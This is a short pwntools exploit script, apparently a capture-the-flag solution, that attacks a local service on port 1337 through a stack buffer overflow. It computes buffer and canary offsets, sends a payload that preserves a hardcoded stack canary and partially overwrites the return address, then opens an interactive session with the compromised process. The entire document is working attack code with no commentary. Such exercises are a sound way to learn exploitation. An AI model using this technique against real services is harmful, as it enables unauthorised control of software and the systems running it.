from pwn import *

# Init
conn = remote("127.0.0.1", 1337)

buffer_length = int("78", 16) #local_78
distance_of_the_canary = int("10", 16) #local_10
distance_between_buffer_and_canary = buffer_length - distance_of_the_canary


# Payload
payload = b"A"*distance_between_buffer_and_canary + b"\x00\x35\x12\x2f\xb4\x9c\xe5\x96" + b"A"*(buffer_length - distance_between_buffer_and_canary - 8) + b"\x9c\x17"

conn.recvuntil("size:")
conn.sendline(str(buffer_length + 2))

conn.recvuntil("bytes)!")
conn.sendline(payload)

conn.interactive()